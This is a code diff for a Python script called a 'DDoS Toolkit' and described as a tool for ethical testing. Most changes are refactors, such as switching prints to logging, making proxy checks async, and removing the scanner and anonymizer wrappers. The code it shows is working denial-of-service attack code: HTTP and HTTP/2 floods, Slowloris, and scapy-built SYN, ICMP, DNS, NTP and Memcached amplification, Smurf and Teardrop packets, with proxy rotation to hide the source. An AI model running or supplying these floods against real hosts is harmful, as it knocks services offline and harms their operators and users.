@@ -10,7 +10,7 @@
 # Description:       A toolkit designed for simulating various types of Distributed Denial of Service (DDoS) attacks for ethical cybersecurity testing.
 # Author:
 # + MIDØ <https://github.com/Midohajhouj>
-# Version:           v3.0
+# Version:           v.1.0
 # License:           MIT License - https://opensource.org/licenses/MIT
 ### END INIT INFO ###
 
@@ -19,7 +19,6 @@ import asyncio
 import time
 import argparse
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import random
 import json
 from itertools import cycle
@@ -32,13 +31,10 @@ import hmac
 import signal
 import sys
 import os
-import subprocess
 import socket
-import struct
 import logging
 from logging.handlers import RotatingFileHandler
 import psutil
-import shutil
 import scapy.all as scapy
 import dns.resolver
 from colorama import init, Fore, Style
@@ -48,6 +44,7 @@ import ssl
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
+
 # Colors
 RED = Fore.RED
 GREEN = Fore.GREEN
@@ -79,7 +76,7 @@ HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
 # Logging setup with rotation
 log_file = "/opt/DDoS-Toolkit/logs/load_test.log"
 os.makedirs(os.path.dirname(log_file), exist_ok=True)
-handler = RotatingFileHandler(log_file, maxBytes=10*1024*1024, backupCount=5)  # 10 MB per file, keep 5 backups
+handler = RotatingFileHandler(log_file, maxBytes=10 * 1024 * 1024, backupCount=5)  # 10 MB per file, keep 5 backups
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
@@ -98,6 +95,7 @@ def display_banner():
 ██████████████████████████████████████████████████████
 {RESET}
 """)
+
 
 def minimal_help():
     print(f"""
@@ -124,6 +122,7 @@ Example:
   ddos -i  # Start interactive mode
 """)
 
+
 def parse_args():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(description="DDoS Toolkit Coded By MIDØ")
@@ -145,59 +144,63 @@ def parse_args():
     parser.add_argument("-i", "--interactive", action="store_true", help="Start the interactive CLI")
     return parser.parse_args()
 
+
 def load_proxies(proxy_file: str):
     """Load proxies from a file."""
     try:
         with open(proxy_file, "r") as f:
             proxy_list = f.read().splitlines()
         valid_proxies = [p.strip() for p in proxy_list if p.strip()]
-        print(f"Loaded {len(valid_proxies)} proxies.")
+        logging.info(f"Loaded {len(valid_proxies)} proxies.")
         return valid_proxies
     except FileNotFoundError:
-        print(f"Proxy file '{proxy_file}' not found.")
+        logging.error(f"Proxy file '{proxy_file}' not found.")
         return []
 
-def validate_proxies(proxies):
+
+async def validate_proxies(proxies):
     """Validate proxies."""
     validated_proxies = []
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
-        for future in as_completed(future_to_proxy):
-            proxy = future_to_proxy[future]
-            try:
-                if future.result():
-                    validated_proxies.append(proxy)
-            except Exception as e:
-                logging.error(f"Proxy validation failed for {proxy}: {e}")
-    print(f"Validated {len(validated_proxies)} proxies.")
+    async with aiohttp.ClientSession() as session:
+        tasks = [check_proxy(session, proxy) for proxy in proxies]
+        results = await asyncio.gather(*tasks)
+        validated_proxies = [proxy for proxy, is_valid in zip(proxies, results) if is_valid]
+    logging.info(f"Validated {len(validated_proxies)} proxies.")
     return validated_proxies
 
-async def check_proxy(proxy: str):
+
+async def check_proxy(session, proxy: str):
     """Check if a proxy is valid."""
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
-                return response.status == 200
-    except Exception:
+        async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
+            return response.status == 200
+    except Exception as e:
+        logging.error(f"Proxy validation error: {e}")
         return False
 
-async def check_proxy_health(proxy: str):
-    """Check the health of a proxy."""
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
-                return response.status == 200
-    except Exception:
-        return False
 
 async def monitor_proxy_health(proxies):
     """Continuously monitor the health of proxies."""
     while not stop_event.is_set():
-        for proxy in proxies:
-            if not await check_proxy_health(proxy):
-                proxies.remove(proxy)
-                print(f"Removed unhealthy proxy: {proxy}")
+        async with aiohttp.ClientSession() as session:
+            tasks = [check_proxy_health(session, proxy) for proxy in proxies]
+            results = await asyncio.gather(*tasks)
+            for proxy, is_healthy in zip(proxies, results):
+                if not is_healthy:
+                    proxies.remove(proxy)
+                    logging.info(f"Removed unhealthy proxy: {proxy}")
         await asyncio.sleep(60)  # Check every 60 seconds
+
+
+async def check_proxy_health(session, proxy: str):
+    """Check the health of a proxy."""
+    try:
+        async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
+            return response.status == 200
+    except Exception as e:
+        logging.error(f"Proxy health check error: {e}")
+        return False
+
 
 def generate_payload(payload_type: str):
     """Generate a payload for HTTP requests."""
@@ -224,103 +227,23 @@ def generate_payload(payload_type: str):
     else:
         return None
 
-def run_network_scanner(target_ip):
-    """Run the netscan script with enhanced error handling and validation."""
-    try:
-        # Define the main directory for netscan.py
-        netscan_path = "/opt/DDoS-Toolkit/assets/netscan"
-        
-        # Check if netscan.py exists in the defined directory
-        if not os.path.isfile(netscan_path):
-            print(f"{RED}[!] netscan not found in /opt/DDoS-Toolkit/assets/ ...... Aborting.{RESET}")
-            return
-
-        # Check if Python3 is installed
-        if not shutil.which("python3"):
-            print(f"{RED}[!] Python3 is not installed or not in PATH. Please install it to proceed.{RESET}")
-            return
-
-        # Build the command
-        command = ["python3", netscan_path, "-t", target_ip]
-
-        # Execute the command
-        print(f"{BLUE}[*] Starting network scan on {target_ip}...{RESET}")
-        subprocess.run(command, check=True)
-
-        print(f"{GREEN}[+] Network scan on {target_ip} completed successfully.{RESET}")
-
-    except subprocess.CalledProcessError as cpe:
-        print(f"{RED}[!] Error during network scan: {cpe}.{RESET}")
-    except FileNotFoundError as fnf:
-        print(f"{RED}[!] Required file or command not found: {fnf}.{RESET}")
-    except Exception as e:
-        print(f"{RED}[!] An unexpected error occurred: {e}.{RESET}")
-
-def run_anonymizer(mode):
-    """Run the anonymizer script with error handling and validation."""
-    try:
-        # Define the main directory for anonymizer
-        anonymizer_path = "/opt/DDoS-Toolkit/assets/anonymizer"
-        
-        # Check if anonymizer exists in the defined directory
-        if not os.path.isfile(anonymizer_path):
-            print(f"{RED}[ERROR] anonymizer script not found in {anonymizer_path}. Aborting.{RESET}")
-            sys.exit(1)  # Exit the script
-        
-        # Validate the mode
-        if mode not in ["start", "stop"]:
-            print(f"{YELLOW}[WARNING] Invalid mode '{mode}' specified. Please use 'start' or 'stop'.{RESET}")
-            sys.exit(1)  # Exit the script
-        
-        # Build the command
-        command = ["bash", anonymizer_path, mode]
-        
-        # Notify user about the action
-        action_message = "Starting" if mode == "start" else "Stopping"
-        print(f"{BLUE}[INFO] {action_message} anonymizer...{RESET}")
-        
-        # Execute the command
-        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-        # Check command result
-        if result.returncode == 0:
-            print(f"{GREEN}[SUCCESS] anonymizer {mode} completed successfully!{RESET}")
-        else:
-            print(f"{RED}[ERROR] anonymizer {mode} failed with return code {result.returncode}.{RESET}")
-            print(f"{RED}[DETAILS] {result.stderr.strip()}{RESET}")
-            sys.exit(1)  # Exit the script on failure
-    
-    except FileNotFoundError:
-        print(f"{RED}[ERROR] 'bash' not found. Ensure bash is installed and available in PATH.{RESET}")
-        sys.exit(1)  # Exit the script
-    
-    except subprocess.SubprocessError as e:
-        print(f"{RED}[ERROR] Subprocess error occurred: {e}{RESET}")
-        sys.exit(1)  # Exit the script
-    
-    except Exception as e:
-        print(f"{RED}[ERROR] An unexpected error occurred: {e}.{RESET}")
-        sys.exit(1)  # Exit the script
-    
-    finally:
-        print(f"{BLUE}[INFO] Exiting anonymizer handler.{RESET}")
-        sys.exit(0)  # Exit the script after completion
 
 async def resolve_target(target_url: str):
     """Resolve the target URL to an IP address."""
     try:
         domain_or_ip = target_url.split("//")[-1].split("/")[0]
         if is_valid_ip(domain_or_ip):
-            print(f"Target is an IP address: {domain_or_ip}")
+            logging.info(f"Target is an IP address: {domain_or_ip}")
             return domain_or_ip
         # Use dnspython to resolve the domain to an IP
         resolver = dns.resolver.Resolver()
         ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
-        print(f"Resolved {domain_or_ip} to IP: {ip}")
+        logging.info(f"Resolved {domain_or_ip} to IP: {ip}")
         return ip
     except Exception as e:
         logging.error(f"Failed to resolve domain: {e}")
         return None
+
 
 def is_valid_ip(ip: str):
     """Check if the given string is a valid IP address."""
@@ -329,6 +252,7 @@ def is_valid_ip(ip: str):
         return True
     except socket.error:
         return False
+
 
 async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
     """Perform an HTTP flood attack with improved concurrency and payload variation."""
@@ -371,6 +295,7 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                         await asyncio.sleep(2 ** attempt)  # Exponential backoff
                 await asyncio.sleep(pause_time)
 
+
 async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
     """Perform a Slowloris attack with improved connection persistence and dynamic headers."""
     global requests_sent, successful_requests, failed_requests
@@ -407,9 +332,10 @@ async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxi
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
 
+
 def syn_flood(target_ip, target_port, duration):
     """Perform a SYN flood attack with enhanced packet crafting and rate control."""
-    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    logging.info(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -419,13 +345,14 @@ def syn_flood(target_ip, target_port, duration):
             packet = ip_layer / tcp_layer
             scapy.send(packet, verbose=False)
         except Exception as e:
-            print(f"Error during SYN flood: {e}")
+            logging.error(f"Error during SYN flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("SYN flood attack completed.")
+    logging.info("SYN flood attack completed.")
+
 
 def icmp_flood(target_ip, duration):
     """Perform an ICMP flood attack with enhanced packet variation and rate control."""
-    print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
+    logging.info(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -433,13 +360,14 @@ def icmp_flood(target_ip, duration):
             packet = scapy.IP(dst=target_ip) / scapy.ICMP() / ("X" * random.randint(64, 128))
             scapy.send(packet, verbose=False)
         except Exception as e:
-            print(f"Error during ICMP flood: {e}")
+            logging.error(f"Error during ICMP flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("ICMP flood attack completed.")
+    logging.info("ICMP flood attack completed.")
+
 
 async def dns_amplification(target_ip, duration):
     """Perform a DNS amplification attack with enhanced query variation and rate control."""
-    print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
+    logging.info(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     dns_queries = ["example.com", "google.com", "yahoo.com", "bing.com", "amazon.com"]
     while time.time() - start_time < duration:
@@ -449,13 +377,14 @@ async def dns_amplification(target_ip, duration):
             packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname=query))
             scapy.send(packet, verbose=False)
         except Exception as e:
-            print(f"Error during DNS amplification: {e}")
+            logging.error(f"Error during DNS amplification: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("DNS amplification attack completed.")
+    logging.info("DNS amplification attack completed.")
+
 
 def ftp_flood(target_ip, target_port, duration):
     """Perform an FTP flood attack with improved connection management and payload variation."""
-    print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    logging.info(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -466,13 +395,14 @@ def ftp_flood(target_ip, target_port, duration):
             sock.send(os.urandom(random.randint(512, 1024)))
             sock.close()
         except Exception as e:
-            print(f"Error during FTP flood: {e}")
+            logging.error(f"Error during FTP flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("FTP flood attack completed.")
+    logging.info("FTP flood attack completed.")
+
 
 def ssh_flood(target_ip, target_port, duration):
     """Perform an SSH flood attack with improved connection management and payload variation."""
-    print(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    logging.info(f"Starting SSH flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -483,13 +413,14 @@ def ssh_flood(target_ip, target_port, duration):
             sock.send(os.urandom(random.randint(512, 1024)))
             sock.close()
         except Exception as e:
-            print(f"Error during SSH flood: {e}")
+            logging.error(f"Error during SSH flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("SSH flood attack completed.")
+    logging.info("SSH flood attack completed.")
+
 
 async def ssl_flood(target_ip, target_port, duration):
     """Perform an SSL/TLS flood attack by exhausting server resources with handshakes."""
-    print(f"Starting SSL/TLS flood attack on {target_ip}:{target_port} for {duration} seconds...")
+    logging.info(f"Starting SSL/TLS flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     context = ssl.create_default_context()
 
@@ -502,9 +433,10 @@ async def ssl_flood(target_ip, target_port, duration):
             # Send a partial handshake and close the connection
             ssl_sock.close()
         except Exception as e:
-            print(f"Error during SSL/TLS flood: {e}")
+            logging.error(f"Error during SSL/TLS flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("SSL/TLS flood attack completed.")
+    logging.info("SSL/TLS flood attack completed.")
+
 
 async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
     """Perform an HTTP/2 flood attack with enhanced features and rate limiting."""
@@ -545,9 +477,10 @@ async def http2_flood(target_url, stop_event, pause_time, rate_limit, proxies=No
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
 
+
 def ntp_amplification(target_ip, duration):
     """Perform an NTP amplification attack."""
-    print(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
+    logging.info(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -555,13 +488,14 @@ def ntp_amplification(target_ip, duration):
             packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
             scapy.send(packet, verbose=False)
         except Exception as e:
-            print(f"Error during NTP amplification: {e}")
+            logging.error(f"Error during NTP amplification: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("NTP amplification attack completed.")
+    logging.info("NTP amplification attack completed.")
+
 
 def memcached_amplification(target_ip, duration):
     """Perform a Memcached amplification attack."""
-    print(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
+    logging.info(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -569,13 +503,14 @@ def memcached_amplification(target_ip, duration):
             packet = scapy.IP(dst=target_ip) / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
             scapy.send(packet, verbose=False)
         except Exception as e:
-            print(f"Error during Memcached amplification: {e}")
+            logging.error(f"Error during Memcached amplification: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("Memcached amplification attack completed.")
+    logging.info("Memcached amplification attack completed.")
+
 
 def smurf_attack(target_ip, duration):
     """Perform a Smurf attack."""
-    print(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
+    logging.info(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -583,13 +518,14 @@ def smurf_attack(target_ip, duration):
             packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
             scapy.send(packet, verbose=False)
         except Exception as e:
-            print(f"Error during Smurf attack: {e}")
+            logging.error(f"Error during Smurf attack: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("Smurf attack completed.")
+    logging.info("Smurf attack completed.")
+
 
 def teardrop_attack(target_ip, duration):
     """Perform a Teardrop attack."""
-    print(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
+    logging.info(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
         try:
@@ -599,12 +535,13 @@ def teardrop_attack(target_ip, duration):
             scapy.send(packet, verbose=False)
             scapy.send(packet2, verbose=False)
         except Exception as e:
-            print(f"Error during Teardrop attack: {e}")
+            logging.error(f"Error during Teardrop attack: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
-    print("Teardrop attack completed.")
+    logging.info("Teardrop attack completed.")
+
 
 def display_status(stop_event: threading.Event, duration: int, results_file=None):
-    """Display the status of the load test."""
+    """Display the status of the load test with colorized output."""
     start_time = time.time()
     results = []
     with tqdm(total=duration, desc="Progress") as pbar:
@@ -627,14 +564,15 @@ def display_status(stop_event: threading.Event, duration: int, results_file=None
                     "Network Usage": psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv,
                 }
                 results.append(stats)
-                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f} | CPU: {stats['CPU Usage']}% | Memory: {stats['Memory Usage']}% | Network: {stats['Network Usage']} bytes{RESET}")
+                print(f"{GREEN}Requests Sent: {requests_sent} | {GREEN}Successful: {successful_requests} | {RED}Failed: {failed_requests} | {BLUE}RPS: {rps:.2f} | {YELLOW}CPU: {stats['CPU Usage']}% | {YELLOW}Memory: {stats['Memory Usage']}% | {BLUE}Network: {stats['Network Usage']} bytes{RESET}")
             pbar.update(1)
             time.sleep(1)
 
     if results_file:
         with open(results_file, "w") as f:
             json.dump(results, f, indent=4)
-        print(f"Results saved to {results_file}")
+        logging.info(f"Results saved to {results_file}")
+
 
 def calculate_rps_stats():
     """Calculate RPS statistics."""
@@ -646,12 +584,14 @@ def calculate_rps_stats():
         "avg": sum(rps_history) / len(rps_history),
     }
 
+
 def signal_handler(sig, frame):
     """Handle interrupt signals."""
     global stop_event
-    print(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
+    logging.info(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
     stop_event.set()  # Signal all threads to stop
     sys.exit(0)
+
 
 class DDoSToolkitCLI(cmd.Cmd):
     """Interactive CLI for the DDoS Toolkit."""
@@ -661,7 +601,7 @@ class DDoSToolkitCLI(cmd.Cmd):
         """Start an attack with the specified parameters."""
         args = arg.split()
         if len(args) < 2:
-            print(f"{RED}Usage: attack <url> <attack-mode> [options]{RESET}")
+            logging.error(f"{RED}Usage: attack <url> <attack-mode> [options]{RESET}")
             return
 
         target_url = args[0]
@@ -686,8 +626,9 @@ class DDoSToolkitCLI(cmd.Cmd):
 
     def do_exit(self, arg):
         """Exit the CLI."""
-        print(f"{GREEN}Exiting DDoS Toolkit CLI.{RESET}")
+        logging.info(f"{GREEN}Exiting DDoS Toolkit CLI.{RESET}")
         return True
+
 
 async def main(target_url, attack_mode, args):
     """Main function to run the load test."""
@@ -698,13 +639,13 @@ async def main(target_url, attack_mode, args):
 
     proxies = load_proxies(args.proxies) if args.proxies else []
     if proxies:
-        proxies = validate_proxies(proxies)
+        proxies = await validate_proxies(proxies)
         asyncio.create_task(monitor_proxy_health(proxies))
 
     headers = json.loads(args.headers) if args.headers else None
 
     if not await resolve_target(target_url):
-        print(f"{RED}Exiting: Target is not reachable.{RESET}")
+        logging.error(f"{RED}Exiting: Target is not reachable.{RESET}")
         return
 
     tasks = []
@@ -768,10 +709,11 @@ async def main(target_url, attack_mode, args):
 
     # Display final statistics
     stats = calculate_rps_stats()
-    print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")
+    logging.info(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")
 
     if args.results:
-        print(f"{GREEN}Results saved to {args.results}{RESET}")
+        logging.info(f"{GREEN}Results saved to {args.results}{RESET}")
+
 
 if __name__ == "__main__":
     # Handle signals for graceful exit
